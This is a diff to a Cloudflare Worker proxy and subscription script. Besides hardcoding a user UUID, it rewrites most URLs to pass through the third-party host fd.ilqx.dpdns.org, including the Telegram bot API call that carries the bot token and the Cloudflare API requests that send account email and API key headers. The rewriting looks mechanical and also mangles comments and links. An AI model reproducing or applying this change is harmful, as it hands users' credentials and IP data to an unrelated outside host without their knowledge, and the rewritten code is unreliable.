@@ -1,7 +1,7 @@
 
 import { connect } from 'cloudflare:sockets';
 
-let userID = '';
+let userID = '0e274389-cbb9-42f5-beb5-cd8bce6a0057';
 let proxyIP = '';
 let DNS64Server = '';
 //let sub = '';
@@ -14,7 +14,7 @@ let parsedSocks5Address = {};
 let enableSocks = false;
 let enableHttp = false;
 let noTLS = 'false';
-const expire = 4102329600;//2099-12-31
+const expire = 1767225600;
 let proxyIPs;
 let socks5s;
 let go2Socks5s = [
@@ -537,8 +537,8 @@ function makeReadableWebSocketStream(webSocketServer, earlyDataHeader, log) {
     return stream;
 }
 
-// https://xtls.github.io/development/protocols/维列斯.html
-// https://github.com/zizifn/excalidraw-backup/blob/main/v2ray-protocol.excalidraw
+// https://fd.ilqx.dpdns.org/https://xtls.github.io/development/protocols/维列斯.html
+// https://fd.ilqx.dpdns.org/https://github.com/zizifn/excalidraw-backup/blob/main/v2ray-protocol.excalidraw
 
 /**
  * 解析 维列斯 协议的头部数据
@@ -953,7 +953,7 @@ async function socks5Connect(addressType, addressRemote, portRemote, log) {
     // | 1  |	1	 | 1 to 255 |
     // +----+----------+----------+
 
-    // https://en.wikipedia.org/wiki/SOCKS#SOCKS5
+    // https://fd.ilqx.dpdns.org/https://en.wikipedia.org/wiki/SOCKS#SOCKS5
     // METHODS 字段的含义:
     // 0x00 不需要认证
     // 0x02 用户名/密码认证 https://datatracker.ietf.org/doc/html/rfc1929
@@ -1541,19 +1541,19 @@ async function 生成配置信息(userID, hostName, sub, UA, RproxyIP, _url, fak
             Subscribe / sub 订阅地址, 点击链接自动 <strong>复制订阅链接</strong> 并 <strong>生成订阅二维码</strong> <br>
             ---------------------------------------------------------------<br>
             自适应订阅地址:<br>
-            <a href="javascript:void(0)" onclick="copyToClipboard('https://${proxyhost}${hostName}/${uuid}?sub','qrcode_0')" style="color:blue;text-decoration:underline;cursor:pointer;">https://${proxyhost}${hostName}/${uuid}</a><br>
+            <a href="javascript:void(0)" onclick="copyToClipboard('https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?sub','qrcode_0')" style="color:blue;text-decoration:underline;cursor:pointer;">https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}</a><br>
             <div id="qrcode_0" style="margin: 10px 10px 10px 10px;"></div>
             Base64订阅地址:<br>
-            <a href="javascript:void(0)" onclick="copyToClipboard('https://${proxyhost}${hostName}/${uuid}?b64','qrcode_1')" style="color:blue;text-decoration:underline;cursor:pointer;">https://${proxyhost}${hostName}/${uuid}?b64</a><br>
+            <a href="javascript:void(0)" onclick="copyToClipboard('https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?b64','qrcode_1')" style="color:blue;text-decoration:underline;cursor:pointer;">https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?b64</a><br>
             <div id="qrcode_1" style="margin: 10px 10px 10px 10px;"></div>
             clash订阅地址:<br>
-            <a href="javascript:void(0)" onclick="copyToClipboard('https://${proxyhost}${hostName}/${uuid}?clash','qrcode_2')" style="color:blue;text-decoration:underline;cursor:pointer;">https://${proxyhost}${hostName}/${uuid}?clash</a><br>
+            <a href="javascript:void(0)" onclick="copyToClipboard('https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?clash','qrcode_2')" style="color:blue;text-decoration:underline;cursor:pointer;">https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?clash</a><br>
             <div id="qrcode_2" style="margin: 10px 10px 10px 10px;"></div>
             singbox订阅地址:<br>
-            <a href="javascript:void(0)" onclick="copyToClipboard('https://${proxyhost}${hostName}/${uuid}?sb','qrcode_3')" style="color:blue;text-decoration:underline;cursor:pointer;">https://${proxyhost}${hostName}/${uuid}?sb</a><br>
+            <a href="javascript:void(0)" onclick="copyToClipboard('https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?sb','qrcode_3')" style="color:blue;text-decoration:underline;cursor:pointer;">https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?sb</a><br>
             <div id="qrcode_3" style="margin: 10px 10px 10px 10px;"></div>
             loon订阅地址:<br>
-            <a href="javascript:void(0)" onclick="copyToClipboard('https://${proxyhost}${hostName}/${uuid}?loon','qrcode_5')" style="color:blue;text-decoration:underline;cursor:pointer;">https://${proxyhost}${hostName}/${uuid}?loon</a><br>
+            <a href="javascript:void(0)" onclick="copyToClipboard('https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?loon','qrcode_5')" style="color:blue;text-decoration:underline;cursor:pointer;">https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?loon</a><br>
             <div id="qrcode_5" style="margin: 10px 10px 10px 10px;"></div>
             <strong><a href="javascript:void(0);" id="noticeToggle" onclick="toggleNotice()">实用订阅技巧∨</a></strong><br>
                 <div id="noticeContent" class="notice-content" style="display: none;">
@@ -1562,16 +1562,16 @@ async function 生成配置信息(userID, hostName, sub, UA, RproxyIP, _url, fak
                     <strong>2.</strong> 如您使用的是 SSR+ 路由插件，推荐使用 <strong>Base64订阅地址</strong> 进行订阅；<br>
                     <br>
                     <strong>3.</strong> 快速切换 <a href='${atob('aHR0cHM6Ly9naXRodWIuY29tL2NtbGl1L1dvcmtlclZsZXNzMnN1Yg==')}'>优选订阅生成器</a> 至：sub.google.com，您可将"?sub=sub.google.com"参数添加到链接末尾，例如：<br>
-                    &nbsp;&nbsp;https://${proxyhost}${hostName}/${uuid}<strong>?sub=sub.google.com</strong><br>
+                    &nbsp;&nbsp;https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}<strong>?sub=sub.google.com</strong><br>
                     <br>
                     <strong>4.</strong> 快速更换 PROXYIP 至：proxyip.cmliussss.net:443，您可将"?proxyip=proxyip.cmliussss.net:443"参数添加到链接末尾，例如：<br>
-                    &nbsp;&nbsp; https://${proxyhost}${hostName}/${uuid}<strong>?proxyip=proxyip.cmliussss.net:443</strong><br>
+                    &nbsp;&nbsp; https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}<strong>?proxyip=proxyip.cmliussss.net:443</strong><br>
                     <br>
                     <strong>5.</strong> 快速更换 SOCKS5 至：user:password@127.0.0.1:1080，您可将"?socks5=user:password@127.0.0.1:1080"参数添加到链接末尾，例如：<br>
-                    &nbsp;&nbsp;https://${proxyhost}${hostName}/${uuid}<strong>?socks5=user:password@127.0.0.1:1080</strong><br>
+                    &nbsp;&nbsp;https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}<strong>?socks5=user:password@127.0.0.1:1080</strong><br>
                     <br>
                     <strong>6.</strong> 如需指定多个参数则需要使用'&'做间隔，例如：<br>
-                    &nbsp;&nbsp;https://${proxyhost}${hostName}/${uuid}?sub=sub.google.com<strong>&</strong>proxyip=proxyip.cmliussss.net<br>
+                    &nbsp;&nbsp;https://fd.ilqx.dpdns.org/https://${proxyhost}${hostName}/${uuid}?sub=sub.google.com<strong>&</strong>proxyip=proxyip.cmliussss.net<br>
                 </div>
             <script src="https://cdn.jsdelivr.net/npm/@keeex/qrcodejs-kx@1.0.2/qrcode.min.js"></script>
             <script>
@@ -1689,7 +1689,7 @@ async function 生成配置信息(userID, hostName, sub, UA, RproxyIP, _url, fak
 
             newAddressesapi = await 整理优选列表(addressesapi);
             newAddressescsv = await 整理测速结果('TRUE');
-            url = `https://${hostName}/${fakeUserID + _url.search}`;
+            url = `https://fd.ilqx.dpdns.org/https://${hostName}/${fakeUserID + _url.search}`;
             if (hostName.includes("worker") || hostName.includes("notls") || noTLS == 'true') {
                 if (_url.search) url += '&notls';
                 else url += '?notls';
@@ -2034,7 +2034,7 @@ async function sendMessage(type, ip, add_data = "") {
 
     try {
         let msg = "";
-        const response = await fetch(`http://ip-api.com/json/${ip}?lang=zh-CN`);
+        const response = await fetch(`https://fd.ilqx.dpdns.org/http://ip-api.com/json/${ip}?lang=zh-CN`);
         if (response.ok) {
             const ipInfo = await response.json();
             msg = `${type}\nIP: ${ip}\n国家: ${ipInfo.country}\n<tg-spoiler>城市: ${ipInfo.city}\n组织: ${ipInfo.org}\nASN: ${ipInfo.as}\n${add_data}`;
@@ -2042,7 +2042,7 @@ async function sendMessage(type, ip, add_data = "") {
             msg = `${type}\nIP: ${ip}\n<tg-spoiler>${add_data}`;
         }
 
-        const url = `https://api.telegram.org/bot${BotToken}/sendMessage?chat_id=${ChatID}&parse_mode=HTML&text=${encodeURIComponent(msg)}`;
+        const url = `https://fd.ilqx.dpdns.org/https://api.telegram.org/bot${BotToken}/sendMessage?chat_id=${ChatID}&parse_mode=HTML&text=${encodeURIComponent(msg)}`;
         return fetch(url, {
             method: 'GET',
             headers: {
@@ -2409,7 +2409,7 @@ async function resolveToIPv6(target) {
 
     // 获取域名的IPv4地址
     async function fetchIPv4(domain) {
-        const url = `https://cloudflare-dns.com/dns-query?name=${domain}&type=A`;
+        const url = `https://fd.ilqx.dpdns.org/https://cloudflare-dns.com/dns-query?name=${domain}&type=A`;
         const response = await fetch(url, {
             headers: { 'Accept': 'application/dns-json' }
         });
@@ -2598,25 +2598,25 @@ async function bestIP(request, env, txt = 'ADD.txt') {
             let response;
             if (ipSource === 'as13335') {
                 // AS13335列表
-                response = await fetch('https://raw.githubusercontent.com/ipverse/asn-ip/master/as/13335/ipv4-aggregated.txt');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://raw.githubusercontent.com/ipverse/asn-ip/master/as/13335/ipv4-aggregated.txt');
             } else if (ipSource === 'as209242') {
                 // AS209242列表
-                response = await fetch('https://raw.githubusercontent.com/ipverse/asn-ip/master/as/209242/ipv4-aggregated.txt');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://raw.githubusercontent.com/ipverse/asn-ip/master/as/209242/ipv4-aggregated.txt');
             } else if (ipSource === 'as24429') {
                 // AS24429列表
-                response = await fetch('https://raw.githubusercontent.com/ipverse/asn-ip/master/as/24429/ipv4-aggregated.txt');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://raw.githubusercontent.com/ipverse/asn-ip/master/as/24429/ipv4-aggregated.txt');
             } else if (ipSource === 'as35916') {
                 // AS35916列表
-                response = await fetch('https://raw.githubusercontent.com/ipverse/asn-ip/master/as/35916/ipv4-aggregated.txt');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://raw.githubusercontent.com/ipverse/asn-ip/master/as/35916/ipv4-aggregated.txt');
             } else if (ipSource === 'as199524') {
                 // AS199524列表
-                response = await fetch('https://raw.githubusercontent.com/ipverse/asn-ip/master/as/199524/ipv4-aggregated.txt');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://raw.githubusercontent.com/ipverse/asn-ip/master/as/199524/ipv4-aggregated.txt');
             } else if (ipSource === 'cm') {
                 // CM整理列表
-                response = await fetch('https://raw.githubusercontent.com/cmliu/cmliu/main/CF-CIDR.txt');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://raw.githubusercontent.com/cmliu/cmliu/main/CF-CIDR.txt');
             } else if (ipSource === 'proxyip') {
                 // 反代IP列表 (直接IP，非CIDR)
-                response = await fetch('https://raw.githubusercontent.com/cmliu/ACL4SSR/main/baipiao.txt');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://raw.githubusercontent.com/cmliu/ACL4SSR/main/baipiao.txt');
                 const text = response.ok ? await response.text() : '';
 
                 // 解析并过滤符合端口的IP
@@ -2646,7 +2646,7 @@ async function bestIP(request, env, txt = 'ADD.txt') {
                 }
             } else {
                 // CF官方列表 (默认)
-                response = await fetch('https://www.cloudflare.com/ips-v4/');
+                response = await fetch('https://fd.ilqx.dpdns.org/https://www.cloudflare.com/ips-v4/');
             }
 
             const text = response.ok ? await response.text() : `173.245.48.0/20
@@ -3716,7 +3716,7 @@ async function bestIP(request, env, txt = 'ADD.txt') {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), timeout);
                 
-                const response = await fetch(\`https://\${ip}:\${port}/cdn-cgi/trace\`, {
+                const response = await fetch(\`https://fd.ilqx.dpdns.org/https://\${ip}:\${port}/cdn-cgi/trace\`, {
                     signal: controller.signal,
                     mode: 'cors'
                 });
@@ -4010,7 +4010,7 @@ async function getUsage(accountId, email, apikey, apitoken, all = 100000) {
     async function getAccountId(email, apikey) {
         console.log('正在获取账户信息...');
 
-        const response = await fetch("https://api.cloudflare.com/client/v4/accounts", {
+        const response = await fetch("https://fd.ilqx.dpdns.org/https://api.cloudflare.com/client/v4/accounts", {
             method: "GET",
             headers: {
                 "Content-Type": "application/json",
@@ -4107,7 +4107,7 @@ async function getUsage(accountId, email, apikey, apitoken, all = 100000) {
         }
 
         // 向 Cloudflare GraphQL API 发送请求，获取今日使用量
-        const response = await fetch("https://api.cloudflare.com/client/v4/graphql", {
+        const response = await fetch("https://fd.ilqx.dpdns.org/https://api.cloudflare.com/client/v4/graphql", {
             method: "POST",
             headers: headers,
             body: JSON.stringify({
